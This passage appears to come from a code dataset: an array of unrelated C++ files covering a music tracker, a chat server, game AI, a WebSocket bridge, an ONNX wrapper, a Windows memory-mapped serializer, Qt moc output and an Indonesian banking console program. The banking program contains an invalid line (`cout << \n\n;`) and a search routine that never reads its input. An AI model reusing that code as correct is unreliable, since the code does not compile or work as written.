val) {\n  if (val > 0)\n    val += 1;\n  voices[selectedTrack].delay = val;\n};\nvoid Tracker::SetEnvelopeNum(int val) {\n  voices[selectedTrack].SetEnvelopeNum(val);\n};\n\nvoid Tracker::SetEnvelopeLength(int val) {\n  voices[selectedTrack].SetEnvelopeLength((val));\n};\n\nvoid Tracker::SetOctave(int val) {\n  voices[selectedTrack].SetOctave(val);\n};\n\nvoid Tracker::SetVolume(int val) {\n  voices[selectedTrack].SetVolume(val);\n};\n\nvoid Tracker::SetNote(int val, int track) {\n  if (isPlaying) {\n    //one behind trick\n    if (noteTime > 200) {\n      tracks[track][trackIndex + 1] = val + 1;\n      trackOctaves[track][trackIndex + 1] = voices[selectedTrack].octave;\n      trackInstruments[track][trackIndex + 1] = currentVoice;\n    } else {\n\n      tracks[track][trackIndex] = val + 1;\n      trackOctaves[track][trackIndex] = voices[selectedTrack].octave;\n      trackInstruments[track][trackIndex] = currentVoice;\n    }\n  } else {\n    voices[track].SetNote(val, false, -1, currentVoice);\n  }\n};\n\nvoid Tracker::SetTrackNum(int ",
    "#include \"chatserver.hpp\"\n#include \"json.hpp\"\n#include \"chatservice.hpp\"\n\n#include<string>\n#include<functional>\nusing namespace std;\nusing namespace placeholders;\nusing json = nlohmann::json;\n\nChatServer::ChatServer(\n    EventLoop *loop,\n    const InetAddress &listenAddr,\n    const string &nameArg\n) : _server(loop,listenAddr,nameArg) , _loop(loop)\n{\n    // \u6ce8\u518c\u8fde\u63a5\u56de\u8c03\n    _server.setConnectionCallback( std::bind(&ChatServer::onConnection, this, _1) );\n\n    // \u6ce8\u518c\u6d88\u606f\u56de\u8c03\n    _server.setMessageCallback( std::bind(&ChatServer::onMessage, this, _1, _2, _3) );\n\n    // \u8bbe\u7f6e\u7ebf\u7a0b\u6570\u91cf\n    _server.setThreadNum(4);\n\n}\n\n// \u542f\u52a8\u670d\u52a1\nvoid ChatServer::start(){\n    _server.start();\n}\n\n// \u4e0a\u62a5\u8fde\u63a5\u76f8\u5173\u4fe1\u606f\u7684\u56de\u8c03\u51fd\u6570\nvoid ChatServer::onConnection( const TcpConnectionPtr& conn){\n    // \u5ba2\u6237\u7aef\u65ad\u5f00\u8fde\u63a5\n    if(!conn->connected()){\n        ChatService::instance()->clientCloseException(conn);\n        conn->shutdown();\n    }\n}\n\n// \u4e0a\u62a5\u8bfb\u5199\u4e8b\u4ef6\u76f8\u5173\u4fe1\u606f\u7684\u56de\u8c03\u51fd\u6570\nvoid ChatServer::onMessage( const TcpConnectionPtr& conn, Buffer* buffer, Timestamp time){\n    string buf = buffer->retrieveAllAsString();\n    // \u6570\u636e\u53cd\u5e8f\u5217\u5316\uff08\u89e3\u7801\uff09\n    json js = json::parse(buf);\n    // \u8fbe\u5230\u7684\u76ee\u7684\uff1a\u5b8c\u5168\u89e3\u8026\u7f51\u7edc\u6a21\u5757\u548c\u4e1a\u52a1\u6a21\u5757\u7684\u4ee3\u7801    \u56de\u8c03\u51fd\u6570\n    // \u901a\u8fc7js[\"msgid\"]\u83b7\u53d6-\u300b\u4e1a\u52a1\u5904\u7406\u5668handler-\u300bconn js time\n    auto msgHandler = ChatService::instance()->getHandler(js[\"msgid\"].get<int>());\n    // \u56de\u8c03\u6d88\u606f\u7ed1\u5b9a\u597d\u7684\u4e8b\u4ef6\u5904\u7406\u5668\uff0c\u6765\u6267\u884c\u76f8\u5e94\u7684\u4e1a\u52a1\u5904\u7406\n    msgHandler(conn,js,time);\n}",
    "#include \"stdafx.h\"\n#include \"melee_checker.h\"\n#include \"basemonster/base_monster.h\"\n#include \"../../../Include/xrRender/KinematicsAnimated.h\"\n#include \"../../../xrEngine/xr_collide_form.h\"\n\n#define MAX_TRACE_ENEMY_RANGE\t6.f\n\nfloat CMeleeChecker::distance_to_enemy(const CEntityAlive* enemy)\n{\n\tfloat dist = enemy->Position().distance_to(m_object->Position());\n\tif (dist > MAX_TRACE_ENEMY_RANGE) return dist;\n\n\tFvector enemy_center;\n\tenemy->Center(enemy_center);\n\n\tFvector my_head_pos = get_head_position(m_object);\n\n\tFvector dir;\n\tdir.sub(enemy_center, my_head_pos);\n\tdir.normalize_safe();\n\n\tcollide::ray_defs r_query(my_head_pos, dir, MAX_TRACE_ENEMY_RANGE, CDB::OPT_CULL | CDB::OPT_ONLYNEAREST,\n\t                          collide::rqtObject);\n\tr_res.r_clear();\n\n\tif (m_object->CFORM()->_RayQuery(r_query, r_res))\n\t{\n\t\tif (r_res.r_begin()->O == enemy)\n\t\t\tdist = r_res.r_begin()->range;\n\t}\n\n\treturn (dist);\n}\n\nvoid CMeleeChecker::on_hit_attempt(bool hit_success)\n{\n\t// \u00e4\u00ee\u00e1\u00e0\u00e2\u00e8\u00f2\u00fc \u00ed\u00ee\u00e2\u00fb\u00e9 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00e2 \u00f1\u00f2\u00e5\u00ea\n\tfor (u32 i = HIT_STACK_SIZE - 1; i > 0; i--) m_hit_stack[i] = m_hit_stack[i - 1];\n\tm_hit_stack[0] = hit_success;\n\n\t// \u00ef\u00f0\u00ee\u00e2\u00e5\u00f0\u00e8\u00f2\u00fc \u00ee\u00e4\u00ed\u00ee\u00f0\u00ee\u00e4\u00ed\u00ee\u00f1\u00f2\u00fc \u00f1\u00f2\u00e5\u00ea\u00e0\n\tbool stack_similar = true;\n\tfor (u32 i = 1; i < HIT_STACK_SIZE; i++) if (m_hit_stack[i] != hit_success)\n\t{\n\t\tstack_similar = false;\n\t\tbreak;\n\t}\n\n\tif (!stack_similar) return;\n\n\t// \u00ee\u00e1\u00ed\u00ee\u00e2\u00e8\u00f2\u00fc m_current_min_distance\n\tif (hit_success)\n\t{\n\t\tif (m_current_min_distance + m_as_step < m_min_attack_distance) m_current_min_distance += m_as_step;\n\t\telse m_current_min_distance = m_min_attack_distance;\n\t}\n\telse\n\t{\n\t\tif (m_current_min_distance > m_as_min_dist + m_as_step) m_current_min_distance -= m_as_step;\n\t\telse m_current_min_distance = m_as_min_dist;\n\t}\n}\n\nbool CMeleeChecker::can_start_melee(const CEntityAlive* enemy)\n{\n\tif (!m_object->EnemyMan.see_enemy_now(enemy))\n\t{\n\t\treturn false;\n\t}\n\n\treturn distance_to_enemy(enemy) < get_min_distance();\n}\n\nbool CMeleeChecker::should_stop_melee(const CEntityAlive* enemy)\n{\n\treturn distance_to_enemy(enemy) > get_max_distance();\n}\n",
    "// NornSockets.cpp : This file contains the 'main' function. Program execution begins and ends there.\r\n//\r\n\r\n#include \"SharedMemoryInterface.h\"\r\n#include <ixwebsocket/IXNetSystem.h>\r\n#include \"WebsocketServer.h\"\r\n#include \"DebugLog.h\"\r\n#include \"Support.h\"\r\n#include <csignal>\r\n#include <chrono>\r\n#include <thread>\r\n#include <condition_variable>\r\n#include <mutex>\r\n\r\n\r\n\r\nusing namespace std::chrono_literals;\r\nstatic std::atomic<bool> g_running{true};\r\nstatic std::condition_variable _mainSleep;\r\n// needed out here by win console handler (annoying)\r\n\r\nbool IsRunning()\r\n{\r\n\treturn g_running;\r\n}\r\n\r\nvoid OnFatalError()\r\n{\r\n\tg_running = false;\r\n}\r\n\r\nvoid signalHandler(int signal)\r\n{\r\n\tif (signal == SIGINT || signal == SIGTERM)\r\n\t{\r\n\t\tg_running = false;\r\n\t\t_mainSleep.notify_all();\r\n\t}\r\n}\r\n\r\n#ifdef _WIN32\r\n\r\nstatic std::mutex _mutex;\r\nstatic std::condition_variable _condition;\r\n\r\nBOOL WINAPI ConsoleHandler(DWORD signal) {\r\n\tif (signal == CTRL_CLOSE_EVENT || signal == CTRL_C_EVENT) {\r\n\t\tg_running = false;\r\n\t\t_mainSleep.notify_all();\r\n\r\n\t\tstd::unique_lock lock(_mutex);\r\n\t\t_condition.wait(lock);\r\n\r\n\t\treturn TRUE;\r\n\t}\r\n\treturn FALSE;\r\n}\r\n#endif\r\n\r\nint main()\r\n{\r\n// so signals can wake us up.\r\n\tstd::mutex dummy_mutex;\r\n\tstd::unique_lock lock(dummy_mutex);\r\n\r\n\tstd::signal(SIGINT, signalHandler);\r\n\tstd::signal(SIGTERM, signalHandler);\r\n\r\n#ifndef _WIN32\r\n\tstd::signal(SIGPIPE, SIG_IGN);\r\n#else\r\n\tif (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {\r\n\t\tfprintf(stderr, \"Could not set control handler: %s\\n\", GetLastErrorAsString().c_str());\r\n\t\treturn 1;\r\n\t}\r\n#endif\r\n\r\n\tif (ix::initNetSystem() == false)\r\n\t{\r\n\t\tfprintf(stderr, \"Unable to open web interface.\");\r\n\t\treturn -1;\r\n\t}\r\n\r\n// test debug log\r\n\r\n\tstd::unique_ptr<WebsocketServer>\t   server(new WebsocketServer);\r\n\tstd::unique_ptr<SharedMemoryInterface> interface;\r\n\tstd::unique_ptr<DebugLog>\t\t\t  debugLog;\r\n\r\n\tbool isDebugLogOpen = false;\r\n\tbool isC2E = false;\r\n\r\n\twhile (IsRunning())\r\n\t{\r\n\t\tif (interface == nullptr)\r\n\t\t{\r\n\t\t\tinterface = SharedMemoryInterface::Open();\r\n\r\n\t\t\tif (interface == nullptr)\r\n\t\t\t{\r\n\t\t\t\t_mainSleep.wait_for(lock, 1s);\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\r\n\t\t\tserver->OnGameOpened(interface.get());\r\n\t\t\t_mainSleep.wait_for(lock, 50ms);\r\n\t\t\tisC2E = !interface->isDDE();\r\n\t\t}\r\n\r\n\t\tif (interface->isClosed())\r\n\t\t{\r\n\t\t\tserver->OnGameClosed(interface.get());\r\n\r\n\t\t\tdebugLog = nullptr;\r\n\t\t\tinterface = nullptr;\r\n\t\t\tisDebugLogOpen = false;\r\n\t\t\t_mainSleep.wait_for(lock, 1s);\r\n\t\t\tcontinue;\r\n\t\t}\r\n\r\n\t\tauto log = DebugLog::GetDebugLog();\r\n\t\tbool wrote = false;\r\n\r\n\t\tif(log.size())\r\n\t\t{\r\n\t\t\tif (isDebugLogOpen)\r\n\t\t\t\tisDebugLogOpen = !debugLog->isClosed();\r\n\r\n\t\t\tfor(auto & item : log)\r\n\t\t\t{\r\n\t\t\t\tfprintf(stdout, \"%.*s\", int(item.size()), item.data());\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif(!isC2E)\r\n\t\t{\r\n\t\t\t_mainSleep.wait_for(lock, 1s);\r\n\t\t}\r\n\t\telse if(isC2E)\r\n\t\t{\r\n\t\t\tbool wrote = false;\r\n\t\t\tauto response = interface->send(\"DBG: POLL\");\r\n\r\n\t\t\tif (response.isError == true)\r\n\t\t\t{\r\n\t\t\t\tfprintf(stderr, \"%s\\n\", response.text.data());\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\r\n\t\t\tif (response.text.size())\r\n\t\t\t{\r\n\t\t\t\tif (isDebugLogOpen)\r\n\t\t\t\t\tisDebugLogOpen = !debugLog->isClosed();\r\n\r\n\t\t\t\tsize_t start = 0;\r\n\t\t\t\tsize_t curr = 0;\r\n\t\t\t\tauto txt = response.text.data();\r\n\r\n\t\t\t\tfor (curr = response.text.find(\"ws\", curr); curr != std::string::npos; curr = response.text.find(\"ws\", curr))\r\n\t\t\t\t{\r\n\t\t\t\t\tauto line_end = response.text.find(\"\\n\", curr);\r\n\r\n\t\t\t\t\tif (line_end == std::string::npos)\r\n\t\t\t\t\t\tline_end = response.text.size() - 1;\r\n\r\n\t// not a line begin\r\n\t\t\t\t\tif (curr != 0 && response.text[curr - 1] != '\\n')\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcurr = line_end;\r\n\t\t\t\t\t\tcontinue;\r\n\t\t\t\t\t}\r\n\r\n\t// if we can't parse it it's nosie\r\n\t\t\t\t\tif (!server->Parse(std::string_view(txt + curr, txt + line_end)))\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcurr = line_end;\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse if (curr != 0)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\twrote = true;\r\n\t\t\t\t\t\tfprintf(stdout, \"%.*s\", int(curr-start), txt+start);\r\n\t\t\t\t\t\tstart = line_end+1;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\r\n\t\t\t\tif (start < response.text.size()-1)\r\n\t\t\t\t{\r\n\t\t\t\t\twrote = true;\r\n\t\t\t\t\tfprintf(stdout, \"%.*s\", int(response.text.size()-start), txt+start);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t\tif(wrote)\r\n\t\t\t{\r\n// TODO: if deamon open window to display stdout.\r\n\t\t\t\tif (debugLog == nullptr)\r\n\t\t\t\t{\r\n\t\t\t\t///\tdebugLog = DebugLog::Open();\r\n\t\t\t\t//\tisDebugLogOpen = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t\tfflush(stdout);\r\n\t\t\t}\r\n\r\n\t\t\t_mainSleep.wait_for(lock, 200ms);\r\n\t\t}\r\n\t}\r\n\r\n\tserver.reset();\r\n\tix::uninitNetSystem();\r\n\r\n\treturn 0;\r\n}\r\n",
    "#include \"ONNXModel.hpp\"\n\n#include <onnxruntime/onnxruntime_cxx_api.h>\n\n#include <iostream>\n#include <string>\n#include <vector>\n#include <numeric>\n\n\nONNXModel::ONNXModel(const wchar_t* model_path, \n                    const std::string &EP, \n                    const char* inp_node_name, const std::vector<int64_t> &inp_shape, \n                    const char* out_node_name, const std::vector<int64_t> &out_shape) {\n    // Step 1. Create env\n    this->ort_env = new Ort::Env(ORT_LOGGING_LEVEL_WARNING, \"Default\");\n\n    // Step 2. Set session options\n    Ort::SessionOptions sess_opt;\n\n    // We will now configure different EPs\n    // OpenVINO EP\n    if(EP == \"OpenVINO\") {\n        sess_opt.SetIntraOpNumThreads(1);\n        OrtOpenVINOProviderOptions openvino_opt;\n        openvino_opt.device_type = \"CPU\";\n\n        sess_opt.AppendExecutionProvider_OpenVINO(openvino_opt);\n        std::cout<<\"\\n[+] Configured OpenVINO EP.\";\n    }\n\n    // CUDA EP\n    else if (EP == \"CUDA\") {\n        OrtSessionOptionsAppendExecutionProvider_CUDA(sess_opt, /* device_id = */ 0);\n        std::cout<<\"\\n[+] Configured CUDA EP.\";\n    }\n\n    // TensorRT EP\n    else if (EP == \"TensorRT\") {\n        OrtSessionOptionsAppendExecutionProvider_Tensorrt(sess_opt, /* device_id = */ 0);\n        std::cout<<\"\\n[+] Configured TensorRT EP.\";\n    }\n\n    // Default Backend\n    else {\n        std::cout<<\"\\n[+] No EP provided in YOLO constructor... Defaulting to CPU session.\";\n    }\n\n    sess_opt.SetGraphOptimizationLevel(GraphOptimizationLevel::ORT_ENABLE_ALL);\n    std::cout<<\"\\n[+] GraphOptimizationLevel = ORT_ENABLE_ALL\";\n\n    // Step 3. Create session\n    try {\n        this->ort_sess = new Ort::Session(*(this->ort_env), model_path, sess_opt);\n    } \n    catch (Ort::Exception oe) {\n        std::cout<<\"[-] ONNX RT exception caught: \"<<oe.what() << \". Code: \"<<oe.GetOrtErrorCode()<<\".\\n\";\n        exit(-1);\n    }\n\n    // Step 4. Input preparation\n    try {\n        this->ort_mem_info = new Ort::MemoryInfo(Ort::MemoryInfo::CreateCpu(OrtAllocatorType::OrtArenaAllocator, OrtMemType::OrtMemTypeDefault));\n    }\n    catch (Ort::Exception oe) {\n        std::cout<<\"[-] ONNX RT exception caught: \"<<oe.what() << \". Code: \"<<oe.GetOrtErrorCode()<<\".\\n\";\n        exit(-1);\n    }\n\n    this->inp_node_names.push_back(inp_node_name);\n    this->out_node_names.push_back(out_node_name);\n\n    if(inp_shape.size() == 3) {         // CHW \n        this->inp_shape.push_back(1);   // converting to NCHW\n        this->out_shape.push_back(1);   \n    }\n\n    for(int i = 0; i< inp_shape.size(); ++i)\n        this->inp_shape.push_back(inp_shape[i]);\n    \n    for(int i = 0; i< out_shape.size(); ++i)\n        this->out_shape.push_back(out_shape[i]);\n}\n\nstd::vector<float> ONNXModel::forward(float* input, int batch_size) {\n    this->inp_shape[0] = batch_size;\n    this->inp_shape[0] = batch_size;\n\n    auto model_inp_tensor = Ort::Value::CreateTensor<float>(*this->ort_mem_info, reinterpret_cast<float*>(input), std::accumulate(this->inp_shape.begin(), this->inp_shape.end(), 1, std::multiplies<int64_t>()) /* NxCxHxW */, inp_shape.data(), inp_shape.size());\n\n    auto model_out_tensor = this->ort_sess->Run(Ort::RunOptions{nullptr}, this->inp_node_names.data(), &model_inp_tensor, 1, this->out_node_names.data(), 1);\n\n    /* We assume only 1 output */\n    float* out_float_arr = model_out_tensor[0].GetTensorMutableData<float>();\n    size_t total_elements = std::accumulate(this->out_shape.begin(), this->out_shape.end(), 1, std::multiplies<int64_t>());\n\n    // Copy the data to a std::vector\n    std::vector<float> out_float_vec(out_float_arr, out_float_arr + total_elements);\n\n    return out_float_vec;\n}\n\n\nONNXModel::~ONNXModel() {\n    delete this->ort_env;\n    delete this->ort_sess;\n    delete this->ort_mem_info;\n}",
    "#include <iostream>\n#include <iomanip>\n#include <stdlib.h>\n#include <ctime>\nusing namespace std;\n\n#define persenan 0.1\n\nint n = 0;\nchar nasabah;\nint i, x, pos, a = 0;\nlong int no;\ndouble setor, tarik;\nbool ketemu = false;\n\ntime_t t = time(0);\ntm *now = localtime(&t);\nconst char *dayNames[] = {\"Minggu\", \"Senin\", \"Selasa\", \"Rabu\", \"Kamis\", \"Jumat\", \"Sabtu\"};\nint dayOfWeek = now->tm_wday;\n\nstruct Nasabah\n{\n    char nama[30];\n    long int norek;\n    double saldo;\n} nas[50];\n\nvoid regUser()\n{\n    system(\"cls\");\n    ketemu = false; \nlagi:\n    cout << \"Masukkan nomor rekening  : \";\n    cin >> no;\n    for (i = 0; i < n; i++)\n    {\n        if (no == nas[i].norek)\n        {\n            ketemu = true;\n            break;\n        }\n    }\n    if (ketemu)\n    {\n        cout << \"Nomor rekening tersebut sudah ada, ulangi lagi\" << endl;\n        goto lagi;\n    }\n    else\n    {\n        cout << \"Masukkan nama anda       : \";\n        cin >> nas[n].nama;\n        cout << \"Masukkan saldo awal anda : \";\n        cin >> nas[n].saldo;\n    }\n    nas[n].norek = no;\n    n = n + 1;\n    return;\n}\n\nvoid deposit()\n{\n    system(\"cls\");\n    cout << \"Masukkan nomor rekening : \";\n    cin >> no;\n    ketemu = false;\n    for (i = 0; i < n; i++)\n    {\n        if (no == (nas[i].norek))\n        {\n            pos = i;\n            ketemu = true;\n            break;\n        }\n    }\n    if (ketemu)\n    {\n        cout << \"Masukkan jumlah setoran : \";\n        cin >> setor;\n        nas[pos].saldo = nas[pos].saldo + setor;\n        cout << endl;\n    }\n    else\n        cout << \"Nomor rekening tidak ditemukan!\" << endl;\n    return;\n}\n\nvoid withdrawal()\n{\n    system(\"cls\");\n    cout << \"Masukkan nomor rekening : \";\n    cin >> no;\n    ketemu = false;\n    for (i = 0; i < n; i++)\n    {\n        if (no == (nas[i].norek))\n        {\n            pos = i;\n            ketemu = true;\n            break;\n        }\n    }\n    if (ketemu)\n    {\n        cout << \"Masukkan jumlah penarikan : \";\n        cin >> tarik;\n        if (tarik < (nas[pos].saldo))\n        {\n            nas[pos].saldo = nas[pos].saldo - tarik;\n            cout << endl;\n\n            cout << \"=========================================\" << endl;\n            cout << \"              BUKTI PENARIKAN            \" << endl;\n            cout << \"=========================================\" << endl;\n            cout << \"Hari      : \" << dayNames[dayOfWeek] << endl;\n            cout << \"Tanggal   : \" << __DATE__ << endl;\n            cout << \"Waktu     : \" << __TIME__ << endl;\n            cout << \"=========================================\" << endl;\n            cout << \"No Rekening      : \" << nas[pos].norek << endl;\n            cout << \"Nama Nasabah     : \" << nas[pos].nama << endl;\n            cout << \"Jumlah Penarikan : \" << tarik << endl;\n            cout << \"=========================================\" << endl;\n        }\n        else\n            cout << \"Maaf saldo anda tidak mencukupi\" << endl;\n    }\n    else\n        cout << \"Nomor rekening tidak ditemukan\" << endl;\n    return;\n}\n\nvoid printUser()\n{\n    system(\"cls\");\n    cout << \"|====|================|================|================|\" << endl;\n    cout << \"|NO  |  NO REKENING   |     NAMA       |  TOTAL SALDO   |\" << endl;\n    cout << \"|====|================|================|================|\" << endl;\n    for (i = 0; i < n; i++)\n    {\n        cout << setw(4) << i + 1;\n        cout << setw(14) << nas[i].norek;\n        cout << setw(14) << nas[i].nama;\n        cout << setw(14) << ((nas[i].saldo) + (nas[i].saldo * 0.1)) << endl;\n    }\n    cout << \\n\\n;\n    cout << \"|====|================|================|================|\" << endl;\n    cout << \"jumlah total saldo diatas telah ditambah bunga 10%\" << endl;\n    return;\n}\n\nvoid findUser()\n{\n    system(\"cls\");\n    cout << \"Masukkan nomor rekening yang akan dicari : \";\n    \n    if (ketemu)\n    {\n        cout << \"Nomor rekening            : \" << nas[pos].norek << endl;\n        cout << \"Nama nasabah              : \" << nas[pos].nama << endl;\n        cout << \"Saldo                     : \" << nas[pos].saldo << endl;\n        cout << \"Total saldo setelah bunga : \" << ((nas[i].saldo) + (nas[i].saldo * persenan)) << endl;\n    }\n    else\n        cout << \"Nomor rekening tidak ditemukan!\" << endl;\n    return;\n}\n\nvoid mainMenu()\n{\n    int pil;\n    do\n    {\n        cout << \"=================================\" << endl;\n        cout << \"           MONEY SYSTEM          \" << endl;\n        cout << \"=================================\" << endl;\n        cout << \"1.  Pendaftaran Nasabah          \" << endl;\n        cout << \"2.  Penyetoran                   \" << endl;\n        cout << \"3.  Penarikan                    \" << endl;\n        cout << \"4.  Cetak Daftar Nasabah         \" << endl;\n        cout << \"5.  Cari Nasabah                 \" << endl;\n        cout << \"6.  Keluar                       \" << endl;\n        cout << \"=================================\" << endl;\n        cout << \"\\nPilihan menu : \";\n        cin >> pil;\n        switch (pil)\n        {\n ",
    "/*\r\n * SampleMemoryMappedFileSerialization.cpp\r\n *\r\n *  Created on: 18 A\u011fu 2024\r\n *      Author: ACER\r\n */\r\n\r\n#include \"SampleMemoryMappedFileSerialization.h\"\r\n#include <iostream>\r\n#include <vector>\r\n#include <windows.h>\r\n#include <fcntl.h>\r\n#include <unistd.h>\r\n#include <cstring>\r\n#include \"SampleModel.h\"\r\n\r\n\r\nSampleMemoryMappedFileSerialization::SampleMemoryMappedFileSerialization() {\r\n\t// TODO Auto-generated constructor stub\r\n\r\n}\r\n\r\nSampleMemoryMappedFileSerialization::~SampleMemoryMappedFileSerialization() {\r\n\t// TODO Auto-generated destructor stub\r\n}\r\n\r\nint SampleMemoryMappedFileSerialization::saveTofile(std::vector<SampleModel>& sampleModels){\r\n\r\n    const char* filename = \"sample_models.dat\";\r\n\r\n    // Create adn open file\r\n\tHANDLE hFile = CreateFileA(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\r\n\tif (hFile == INVALID_HANDLE_VALUE) {\r\n\t\tstd::cerr << \"File cannot be opened!\" << std::endl;\r\n\t\treturn 1;\r\n\t}\r\n\r\n\t// Determine file size\r\n\tDWORD filesize = sampleModels.size() * sizeof(SampleModel);\r\n\tSetFilePointer(hFile, filesize - 1, NULL, FILE_BEGIN);\r\n\tSetEndOfFile(hFile);\r\n\r\n\t// Create memory map\r\n\tHANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, filesize, NULL);\r\n\tif (hMapping == NULL) {\r\n\t\tstd::cerr << \"Couldn't create memory mapping!\" << std::endl;\r\n\t\tCloseHandle(hFile);\r\n\t\treturn 1;\r\n\t}\r\n\r\n\t// Create memory view\r\n\tchar* pMap = static_cast<char*>(MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, filesize));\r\n\tif (pMap == NULL) {\r\n\t\tstd::cerr << \"Couldn't create memory view!\" << std::endl;\r\n\t\tCloseHandle(hMapping);\r\n\t\tCloseHandle(hFile);\r\n\t\treturn 1;\r\n\t}\r\n\r\n\t// Write vector data to memory mapped file\r\n\tstd::memcpy(pMap, sampleModels.data(), filesize);\r\n\r\n    // Close map view and file\r\n\tUnmapViewOfFile(pMap);\r\n\tCloseHandle(hMapping);\r\n\tCloseHandle(hFile);\r\n\r\n    std::cout << \"Vector written to memory mapped file.\" << std::endl;\r\n\r\n    return 0;\r\n}\r\n\r\n\r\nint SampleMemoryMappedFileSerialization::readFromFile(){\r\n    const char* filename = \"sample_models.dat\";\r\n\r\n    // Open file to read\r\n    HANDLE hFile = CreateFileA(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\r\n\tif (hFile == INVALID_HANDLE_VALUE) {\r\n\t\tstd::cerr << \"Couldn't open file!\" << std::endl;\r\n\t\treturn 1;\r\n\t}\r\n\r\n\tDWORD filesize = 2 * sizeof(SampleModel);\r\n\r\n\r\n\t// Create memory map\r\n\tHANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, filesize, NULL);\r\n\tif (hMapping == NULL) {\r\n\t\tstd::cerr << \"Couldn't create memory map!\" << std::endl;\r\n\t\tCloseHandle(hFile);\r\n\t\treturn 1;\r\n\t}\r\n\r\n    // Create memory view\r\n\tchar* pMap = static_cast<char*>(MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, filesize));\r\n\tif (pMap == NULL) {\r\n\t\tstd::cerr << \"Couldn't create memory view!\" << std::endl;\r\n\t\tCloseHandle(hMapping);\r\n\t\tCloseHandle(hFile);\r\n\t\treturn 1;\r\n\t}\r\n\r\n\t// Copy memory data to vector\r\n\tstd::vector<SampleModel> sampleModels(filesize / sizeof(SampleModel));\r\n\tstd::memcpy(sampleModels.data(), pMap, filesize);\r\n\r\n\t// Close memory view and file\r\n\tUnmapViewOfFile(pMap);\r\n\tCloseHandle(hMapping);\r\n\tCloseHandle(hFile);\r\n\r\n    // Display Vector data\r\n\tstd::cout << \"Vector read from memory mapped file.\" << std::endl;\r\n    for (const auto& sampleModel : sampleModels) {\r\n                sampleModel.display();\r\n    }\r\n    std::cout << std::endl;\r\n\r\n    return 0;\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n",
    "/****************************************************************************\n** Meta object code from reading C++ file 'WBFloatingPalette.h'\n**\n** Created by: The Qt Meta Object Compiler version 67 (Qt 5.15.2)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include <memory>\n#include \"../../Source/gui/WBFloatingPalette.h\"\n#include <QtCore/qbytearray.h>\n#include <QtCore/qmetatype.h>\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'WBFloatingPalette.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 67\n#error \"This file was generated using the moc from 5.15.2. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\nQT_BEGIN_MOC_NAMESPACE\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nstruct qt_meta_stringdata_WBFloatingPalette_t {\n    QByteArrayData data[9];\n    char stringdata0[105];\n};\n#define QT_MOC_LITERAL(idx, ofs, len) \\\n    Q_STATIC_BYTE_ARRAY_DATA_HEADER_INITIALIZER_WITH_OFFSET(len, \\\n    qptrdiff(offsetof(qt_meta_stringdata_WBFloatingPalette_t, stringdata0) + ofs \\\n        - idx * sizeof(QByteArrayData)) \\\n    )\nstatic const qt_meta_stringdata_WBFloatingPalette_t qt_meta_stringdata_WBFloatingPalette = {\n    {\nQT_MOC_LITERAL(0, 0, 17), // \"WBFloatingPalette\"\nQT_MOC_LITERAL(1, 18, 12), // \"mouseEntered\"\nQT_MOC_LITERAL(2, 31, 0), // \"\"\nQT_MOC_LITERAL(3, 32, 13), // \"minimizeStart\"\nQT_MOC_LITERAL(4, 46, 18), // \"eMinimizedLocation\"\nQT_MOC_LITERAL(5, 65, 8), // \"location\"\nQT_MOC_LITERAL(6, 74, 13), // \"maximizeStart\"\nQT_MOC_LITERAL(7, 88, 9), // \"maximized\"\nQT_MOC_LITERAL(8, 98, 6) // \"moving\"\n\n    },\n    \"WBFloatingPalette\\0mouseEntered\\0\\0\"\n    \"minimizeStart\\0eMinimizedLocation\\0\"\n    \"location\\0maximizeStart\\0maximized\\0\"\n    \"moving\"\n};\n#undef QT_MOC_LITERAL\n\nstatic const uint qt_meta_data_WBFloatingPalette[] = {\n\n // content:\n       8,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       5,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       5,       // signalCount\n\n // signals: name, argc, parameters, tag, flags\n       1,    0,   39,    2, 0x06 /* Public */,\n       3,    1,   40,    2, 0x06 /* Public */,\n       6,    0,   43,    2, 0x06 /* Public */,\n       7,    0,   44,    2, 0x06 /* Public */,\n       8,    0,   45,    2, 0x06 /* Public */,\n\n // signals: parameters\n    QMetaType::Void,\n    QMetaType::Void, 0x80000000 | 4,    5,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n\n       0        // eod\n};\n\nvoid WBFloatingPalette::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        auto *_t = static_cast<WBFloatingPalette *>(_o);\n        Q_UNUSED(_t)\n        switch (_id) {\n        case 0: _t->mouseEntered(); break;\n        case 1: _t->minimizeStart((*reinterpret_cast< eMinimizedLocation(*)>(_a[1]))); break;\n        case 2: _t->maximizeStart(); break;\n        case 3: _t->maximized(); break;\n        case 4: _t->moving(); break;\n        default: ;\n        }\n    } else if (_c == QMetaObject::IndexOfMethod) {\n        int *result = reinterpret_cast<int *>(_a[0]);\n        {\n            using _t = void (WBFloatingPalette::*)();\n            if (*reinterpret_cast<_t *>(_a[1]) == 